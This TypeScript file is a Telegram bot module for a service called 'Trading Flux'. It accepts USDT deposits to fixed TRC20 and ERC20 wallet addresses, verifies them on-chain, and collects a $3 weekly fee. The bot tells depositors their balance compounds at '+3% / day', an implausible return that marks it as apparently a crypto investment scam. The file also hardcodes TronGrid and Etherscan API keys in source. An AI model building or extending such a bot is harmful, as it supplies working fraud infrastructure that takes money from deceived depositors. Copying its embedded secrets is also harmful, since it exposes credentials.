import { Bot, Context, InlineKeyboard } from "grammy";
import { Redis } from "@upstash/redis";
import { computeBalance, computeCurrentBalance } from "../utils/balance";

const WALLET = {
  TRC20: {
    address: "TD1aR1w19wyCDf9GJpn854K39Ct2tbKczN",
    label: "USDT TRC20",
    network: "TRON (TRC20)",
    qrUrl: "https://i.8upload.com/image/bd56036958ca3234/img-20260518-132155-747.jpg",
  },
  ERC20: {
    address: "0xF1dC155EEce939cb1f9f89A58B24aC23FE81D510",
    label: "USDT ERC20",
    network: "Ethereum (ERC20)",
    qrUrl: "https://i.8upload.com/image/c1c7e83dcc27caa8/img-20260518-132950-110.jpg",
  },
} as const;

const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_ERC20_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const TRONGRID_API_KEY = "62267827-ed30-4652-960c-6ff5ba4aa608";
const ETHERSCAN_API_KEY = "9C3GJWEDWZCSI6D3YJ617SAYN1XUP2NVCW";
const MIN_DEPOSIT = 10;
const MIN_FEE_TOPUP = 10;
const WEEKLY_FEE = 3;

type Network = "TRC20" | "ERC20";
type DepositType = "deposit" | "fee_wallet";

function r(): Redis {
  return new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL!,
    token: process.env.UPSTASH_REDIS_REST_TOKEN!,
  });
}

// ── Fee wallet balance helpers ─────────────────────────────────────────────────
export async function getFeeBalance(userId: number): Promise<number> {
  return (await r().get<number>(`fee_bal:${userId}`)) ?? 0;
}

async function addFeeBalance(userId: number, amount: number): Promise<number> {
  const current = await getFeeBalance(userId);
  const newBal = parseFloat((current + amount).toFixed(2));
  await r().set(`fee_bal:${userId}`, newBal);
  return newBal;
}

async function deductFeeBalance(userId: number): Promise<number> {
  const current = await getFeeBalance(userId);
  const newBal = parseFloat(Math.max(0, current - WEEKLY_FEE).toFixed(2));
  await r().set(`fee_bal:${userId}`, newBal);
  return newBal;
}

// ── Redis state ────────────────────────────────────────────────────────────────
interface DepositStep {
  network: Network;
  type: DepositType;
}

interface PendingDeposit {
  userId: number;
  network: Network;
  type: DepositType;
  amount: number;
  baseAmount: number;
  timestamp: number;
}

async function setDepositStep(userId: number, step: DepositStep) {
  await r().set(`deposit_step:${userId}`, step, { ex: 600 });
}
async function getDepositStep(userId: number): Promise<DepositStep | null> {
  return r().get<DepositStep>(`deposit_step:${userId}`);
}
async function clearDepositStep(userId: number) {
  await r().del(`deposit_step:${userId}`);
}
async function savePending(p: PendingDeposit) {
  await r().set(`deposit:${p.userId}`, p, { ex: 3600 });
}
async function getPending(userId: number): Promise<PendingDeposit | null> {
  return r().get<PendingDeposit>(`deposit:${userId}`);
}
async function removePending(userId: number) {
  await r().del(`deposit:${userId}`);
}

function uniqueAmount(base: number): number {
  const cents = Math.floor(Math.random() * 89) + 10;
  return parseFloat((base + cents / 100).toFixed(2));
}

// ── Keyboards ──────────────────────────────────────────────────────────────────
function networkKeyboard(type: DepositType) {
  return new InlineKeyboard()
    .text("USDT TRC20", `dep_net_TRC20_${type}`).row()
    .text("USDT ERC20", `dep_net_ERC20_${type}`).row()
    .text("🔙 Back", "menu_main");
}

function addressKeyboard(network: Network, type: DepositType) {
  return new InlineKeyboard()
    .text("📸 Show QR Code", `dep_qr_${network}_${type}`).row()
    .text("✅ I've Sent Payment", `dep_sent_${network}_${type}`).row()
    .text("🔙 Choose Network", type === "deposit" ? "menu_deposit" : "menu_fee_topup");
}

// ── Shared senders ─────────────────────────────────────────────────────────────
async function sendDepositMenu(ctx: Context, type: DepositType, edit = false) {
  const isDeposit = type === "deposit";
  const text =
    `┌─────────────────────────┐\n` +
    `│  💰 ${isDeposit ? "DEPOSIT FUNDS         " : "TOP UP FEE WALLET     "}│\n` +
    `└─────────────────────────┘\n\n` +
    (isDeposit
      ? `Add funds to your Trading Flux account.\n\n📌 Minimum deposit: *$${MIN_DEPOSIT} USDT*\n`
      : `Add USDT to your fee wallet to cover weekly management fees.\n\n📌 Minimum top-up: *$${MIN_FEE_TOPUP} USDT*\n💡 Each week costs *$${WEEKLY_FEE} USDT*\n`) +
    `\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Select your preferred network:\n\n` +
    `  💜 *TRC20* — Recommended\n` +
    `  🔵 *ERC20*\n`;

  const opts = { parse_mode: "Markdown" as const, reply_markup: networkKeyboard(type) };
  if (edit) {
    try { await ctx.editMessageText(text, opts); return; } catch { }
  }
  await ctx.reply(text, opts);
}

async function sendAddressPage(ctx: Context, network: Network, type: DepositType) {
  const coin = WALLET[network];
  const isDeposit = type === "deposit";
  const amountLabel = isDeposit
    ? `Minimum $${MIN_DEPOSIT} USDT`
    : `Minimum $${MIN_FEE_TOPUP} USDT`;

  await ctx.reply(
    `┌─────────────────────────┐\n` +
    `│  ${coin.label} ${isDeposit ? "DEPOSIT" : "TOP-UP"}            │\n` +
    `└─────────────────────────┘\n\n` +
    `📋 *Send to this address:*\n\n` +
    `\`${coin.address}\`\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Network:  *${coin.network}*\n` +
    `💵 Amount:   *${amountLabel}*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ *Important:*\n` +
    `  • Send *only USDT* on the *${coin.network}* network\n` +
    `  • Sending wrong token = permanent loss\n` +
    `  • Tap QR code for easy scanning\n\n` +
    `After sending, tap ✅ *I've Sent Payment* below.`,
    { parse_mode: "Markdown", reply_markup: addressKeyboard(network, type) }
  );
}

// ── Blockchain checkers ────────────────────────────────────────────────────────
async function checkTRC20(p: PendingDeposit): Promise<{ found: boolean; txId?: string }> {
  const url =
    `https://api.trongrid.io/v1/accounts/${WALLET.TRC20.address}/transactions/trc20` +
    `?only_to=true&contract_address=${USDT_TRC20_CONTRACT}&min_timestamp=${p.timestamp}&limit=50`;

  const res = await fetch(url, { headers: { "TRON-PRO-API-KEY": TRONGRID_API_KEY } });
  const data: any = await res.json();
  const txs: any[] = data?.data ?? [];
  const match = txs.find((tx) => Math.abs(parseInt(tx.value ?? "0") / 1_000_000 - p.amount) < 0.005);
  return { found: !!match, txId: match?.transaction_id };
}

async function checkERC20(p: PendingDeposit): Promise<{ found: boolean; txId?: string }> {
  const startTs = Math.floor(p.timestamp / 1000);
  const url =
    `https://api.etherscan.io/api?module=account&action=tokentx` +
    `&address=${WALLET.ERC20.address}` +
    `&contractaddress=${USDT_ERC20_CONTRACT}` +
    `&startblock=0&endblock=99999999&sort=desc&apikey=${ETHERSCAN_API_KEY}`;

  const res = await fetch(url);
  const data: any = await res.json();
  const txs: any[] = data?.result ?? [];
  const match = txs.find((tx) => {
    if (parseInt(tx.timeStamp ?? "0") < startTs) return false;
    return Math.abs(parseInt(tx.value ?? "0") / 1_000_000 - p.amount) < 0.005;
  });
  return { found: !!match, txId: match?.hash };
}

// ── Credit balance after confirmed payment ─────────────────────────────────────
async function creditBalance(ctx: Context, pending: PendingDeposit, txId: string) {
  await removePending(pending.userId);
  const redis = r();
  const now = new Date();

  if (pending.type === "fee_wallet") {
    const newFeeBal = await addFeeBalance(pending.userId, pending.amount);
    const weeksCovered = Math.floor(newFeeBal / WEEKLY_FEE);

    try {
      await ctx.api.sendMessage(
        process.env.ADMIN_CHANNEL_ID!,
        `💼 <b>FEE WALLET TOP-UP CONFIRMED</b>\n\n` +
        `👤 User ID: <code>${pending.userId}</code>\n` +
        `🌐 Network: <b>${pending.network}</b>\n` +
        `💵 Amount: <b>+${pending.amount.toFixed(2)} USDT</b>\n` +
        `💼 New Fee Balance: <b>$${newFeeBal.toFixed(2)}</b>\n` +
        `📅 Weeks Covered: <b>${weeksCovered}</b>\n` +
        `🔗 TX: <code>${txId}</code>`,
        { parse_mode: "HTML" }
      );
    } catch { }

    await ctx.reply(
      `╔═══════════════════════════╗\n` +
      `║  ✅  FEE WALLET TOPPED UP! ║\n` +
      `╚═══════════════════════════╝\n\n` +
      `🎉 *${pending.amount.toFixed(2)} USDT* added to your fee wallet!\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `💼 *Fee Wallet Balance:* $${newFeeBal.toFixed(2)}\n` +
      `💳 *Weekly Fee Cost:*   $${WEEKLY_FEE}.00\n` +
      `📅 *Weeks Covered:*     ${weeksCovered}\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔗 TX: \`${txId}\`\n\n` +
      `You can now pay your weekly fee instantly — no crypto needed each time!`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("💳 Pay Fee Now ($3)", "menu_fee").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
    return;
  }

  // ── Trading account deposit ───────────────────────────────────────────────
  // Compute true current balance (honours adjustedBalance if present),
  // add the deposited amount, then store as new adjustedBalance from today
  // so profit tracking resets correctly from the new higher base.
  const account = await redis.get<any>(`acct:${pending.userId}`);
  let newBalance: number;

  if (account) {
    const accountData = {
      ...account,
      startDate: new Date(account.startDate as string),
      adjustedDate: account.adjustedDate ? new Date(account.adjustedDate as string) : undefined,
      adjustedBalance: account.adjustedBalance ?? undefined,
    };
    const currentBalance = computeCurrentBalance(accountData, now);
    newBalance = parseFloat((currentBalance + pending.amount).toFixed(2));

    await redis.set(`acct:${pending.userId}`, {
      ...account,
      adjustedBalance: newBalance,
      adjustedDate: now.toISOString(),
    });
  } else {
    newBalance = pending.amount;
  }

  try {
    await ctx.api.sendMessage(
      process.env.ADMIN_CHANNEL_ID!,
      `💰 <b>DEPOSIT AUTO-CONFIRMED</b>\n\n` +
      `👤 User ID: <code>${pending.userId}</code>\n` +
      `🌐 Network: <b>${pending.network}</b>\n` +
      `💵 Amount: <b>${pending.amount.toFixed(2)} USDT</b>\n` +
      `💼 New Balance: <b>$${newBalance.toFixed(2)}</b>\n` +
      `🔗 TX: <code>${txId}</code>`,
      { parse_mode: "HTML" }
    );
  } catch { }

  await ctx.reply(
    `╔═══════════════════════════╗\n` +
    `║  ✅  DEPOSIT CONFIRMED!    ║\n` +
    `╚═══════════════════════════╝\n\n` +
    `🎉 *${pending.amount.toFixed(2)} USDT* has been credited!\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💰 *New Balance:* $${newBalance.toFixed(2)}\n` +
    `📅 Compounding continues from today\n` +
    `📈 Rate: *+3% / day*\n\n` +
    `🔗 TX: \`${txId}\``,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 View Dashboard", "menu_balance").row()
        .text("🏠 Main Menu", "menu_main"),
    }
  );
}

// ── Text input handler (called by form.ts) ─────────────────────────────────────
export async function handleDepositTextInput(ctx: Context): Promise<boolean> {
  const userId = ctx.from!.id;
  const step = await getDepositStep(userId);
  if (!step) return false;

  const text = (ctx.message as any)?.text?.trim() ?? "";
  if (!text || text.startsWith("/")) return false;

  const isDeposit = step.type === "deposit";
  const amount = parseFloat(text.replace(/[^0-9.]/g, ""));

  if (isNaN(amount) || amount <= 0) {
    await ctx.reply(`⚠️ *Invalid amount.* Enter a number (e.g. \`50\`):`, { parse_mode: "Markdown" });
    return true;
  }
  if (isDeposit && amount < MIN_DEPOSIT) {
    await ctx.reply(
      `⚠️ *Minimum deposit is $${MIN_DEPOSIT} USDT.*\n\nYou entered $${amount}. Please enter a higher amount:`,
      { parse_mode: "Markdown" }
    );
    return true;
  }
  if (!isDeposit && amount < MIN_FEE_TOPUP) {
    await ctx.reply(
      `⚠️ *Minimum fee wallet top-up is $${MIN_FEE_TOPUP} USDT.*\n\nYou entered $${amount}. Please enter a higher amount:`,
      { parse_mode: "Markdown" }
    );
    return true;
  }

  await clearDepositStep(userId);

  const exactAmount = uniqueAmount(amount);
  const pending: PendingDeposit = {
    userId, network: step.network, type: step.type,
    amount: exactAmount, baseAmount: amount, timestamp: Date.now(),
  };
  await savePending(pending);

  const coin = WALLET[step.network];

  await ctx.reply(
    `┌─────────────────────────┐\n` +
    `│  💳  SEND EXACT AMOUNT   │\n` +
    `└─────────────────────────┘\n\n` +
    `To auto-detect your payment, send *exactly*:\n\n` +
    `┌─────────────────────────┐\n` +
    `│  💵  *${exactAmount.toFixed(2)} USDT*              │\n` +
    `└─────────────────────────┘\n\n` +
    `📬 *To:* \`${coin.address}\`\n` +
    `🌐 *Network:* ${coin.network}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ Send the *exact amount* shown above.\n` +
    `The unique cents help us identify your payment.\n\n` +
    `⏱ Payment expires in *60 minutes.*`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ I've Sent It — Check Now", "deposit_check").row()
        .text("❌ Cancel", "dep_cancel"),
    }
  );
  return true;
}

// ── Check payment callback ─────────────────────────────────────────────────────
async function handleCheckPayment(ctx: Context) {
  const userId = ctx.from!.id;
  const pending = await getPending(userId);

  if (!pending) {
    await ctx.reply(
      `⚠️ No pending payment found. It may have expired (60 min limit).`,
      {
        reply_markup: new InlineKeyboard()
          .text("💰 New Deposit", "menu_deposit").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
    return;
  }

  await ctx.reply("🔍 *Checking blockchain...*\n\n⏳ Please wait a moment.", { parse_mode: "Markdown" });

  let result: { found: boolean; txId?: string };
  try {
    result = pending.network === "TRC20" ? await checkTRC20(pending) : await checkERC20(pending);
  } catch {
    await ctx.reply(`⚠️ Network error while checking. Please try again.`, {
      reply_markup: new InlineKeyboard()
        .text("🔄 Try Again", "deposit_check").row()
        .text("🏠 Main Menu", "menu_main"),
    });
    return;
  }

  if (!result.found) {
    await ctx.reply(
      `⏳ *Payment Not Detected Yet*\n\n` +
      `We couldn't find your transaction on-chain yet.\n\n` +
      `*${WALLET[pending.network].network}:* ` +
      (pending.network === "TRC20" ? "Usually confirms in 1–3 minutes." : "Usually confirms in 2–5 minutes.") +
      `\n\nMake sure you sent *exactly ${pending.amount.toFixed(2)} USDT*.\n\n` +
      `📬 To: \`${WALLET[pending.network].address}\``,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("🔄 Check Again", "deposit_check").row()
          .text("❌ Cancel", "dep_cancel"),
      }
    );
    return;
  }

  await creditBalance(ctx, pending, result.txId!);
}

// ── Register all handlers ──────────────────────────────────────────────────────
export function registerDepositHandlers(bot: Bot<Context>): void {

  bot.command("deposit", async (ctx) => { await sendDepositMenu(ctx, "deposit"); });

  bot.callbackQuery("menu_deposit", async (ctx) => {
    await ctx.answerCallbackQuery();
    await sendDepositMenu(ctx, "deposit");
  });

  bot.callbackQuery("menu_fee", async (ctx) => {
    await ctx.answerCallbackQuery();
    const userId = ctx.from!.id;
    const feeBal = await getFeeBalance(userId);

    if (feeBal >= WEEKLY_FEE) {
      const newBal = await deductFeeBalance(userId);

      try {
        await ctx.api.sendMessage(
          process.env.ADMIN_CHANNEL_ID!,
          `💳 <b>WEEKLY FEE AUTO-PAID</b>\n\n` +
          `👤 User ID: <code>${userId}</code>\n` +
          `💵 Deducted: <b>$${WEEKLY_FEE}.00</b> from fee wallet\n` +
          `💼 Remaining fee balance: <b>$${newBal.toFixed(2)}</b>`,
          { parse_mode: "HTML" }
        );
      } catch { }

      await ctx.reply(
        `╔═══════════════════════════╗\n` +
        `║  ✅  FEE PAID!              ║\n` +
        `╚═══════════════════════════╝\n\n` +
        `🎉 *$${WEEKLY_FEE}.00* deducted from your fee wallet!\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `💼 *Remaining Fee Balance:* $${newBal.toFixed(2)}\n` +
        `✅ Account management active for another week.\n\n` +
        `_No crypto transaction needed — paid instantly._`,
        {
          parse_mode: "Markdown",
          reply_markup: new InlineKeyboard()
            .text("📊 View Dashboard", "menu_balance").row()
            .text("💰 Top Up Fee Wallet", "menu_fee_topup")
            .text("🏠 Main Menu", "menu_main"),
        }
      );
    } else {
      const needed = (WEEKLY_FEE - feeBal).toFixed(2);
      await ctx.reply(
        `┌─────────────────────────┐\n` +
        `│  💳  PAY WEEKLY FEE       │\n` +
        `└─────────────────────────┘\n\n` +
        `💳 *Weekly Fee:*       $${WEEKLY_FEE}.00 USDT\n` +
        `💼 *Your Fee Wallet:* $${feeBal.toFixed(2)} USDT\n` +
        `📉 *Shortfall:*        $${needed} USDT\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚠️ *Insufficient fee wallet balance.*\n\n` +
        `Top up your Trading Flux fee wallet with at least *$${MIN_FEE_TOPUP} USDT* and pay future fees instantly — no crypto needed each time.\n\n` +
        `💡 _Topping up $30 covers 10 weeks at once._`,
        {
          parse_mode: "Markdown",
          reply_markup: new InlineKeyboard()
            .text("💰 Top Up Fee Wallet", "menu_fee_topup").row()
            .text("🏠 Main Menu", "menu_main"),
        }
      );
    }
  });

  bot.callbackQuery("menu_fee_topup", async (ctx) => {
    await ctx.answerCallbackQuery();
    await sendDepositMenu(ctx, "fee_wallet");
  });

  bot.callbackQuery(/^dep_net_(TRC20|ERC20)_(deposit|fee_wallet)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const [, network, type] = ctx.match as RegExpMatchArray;
    await setDepositStep(ctx.from!.id, { network: network as Network, type: type as DepositType });
    await sendAddressPage(ctx, network as Network, type as DepositType);
  });

  bot.callbackQuery(/^dep_qr_(TRC20|ERC20)_(deposit|fee_wallet)$/, async (ctx) => {
    await ctx.answerCallbackQuery("Loading QR code...");
    const [, network, type] = ctx.match as RegExpMatchArray;
    const coin = WALLET[network as Network];
    const isDeposit = type === "deposit";
    await ctx.replyWithPhoto(coin.qrUrl, {
      caption:
        `📸 *${coin.label} QR Code*\n\n` +
        `Scan with your wallet to get the address.\n\n` +
        `🌐 Network: *${coin.network}*\n` +
        `💵 ${isDeposit ? `Minimum: *$${MIN_DEPOSIT} USDT*` : `Minimum: *$${MIN_FEE_TOPUP} USDT*`}\n\n` +
        `Or copy manually:\n\`${coin.address}\``,
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ I've Sent Payment", `dep_sent_${network}_${type}`).row()
        .text("🔙 Back to Address", `dep_net_${network}_${type}`),
    });
  });

  bot.callbackQuery(/^dep_sent_(TRC20|ERC20)_(deposit|fee_wallet)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const [, network, type] = ctx.match as RegExpMatchArray;
    const isDeposit = type === "deposit";
    await setDepositStep(ctx.from!.id, { network: network as Network, type: type as DepositType });
    await ctx.reply(
      `💬 *How much did you send?*\n\n` +
      `Enter the exact USDT amount you sent:\n` +
      `_e.g._ \`${isDeposit ? "50" : "10"}\`\n\n` +
      `${isDeposit ? `📌 Minimum: *$${MIN_DEPOSIT} USDT*` : `📌 Minimum: *$${MIN_FEE_TOPUP} USDT*`}`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("❌ Cancel", "dep_cancel") }
    );
  });

  bot.callbackQuery("deposit_check", async (ctx) => {
    await ctx.answerCallbackQuery();
    await handleCheckPayment(ctx);
  });

  bot.callbackQuery("dep_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await clearDepositStep(ctx.from!.id);
    await removePending(ctx.from!.id);
    await ctx.reply(
      `❌ *Payment cancelled.*\n\nNo submission was made.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("💰 Try Again", "menu_deposit").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });
}
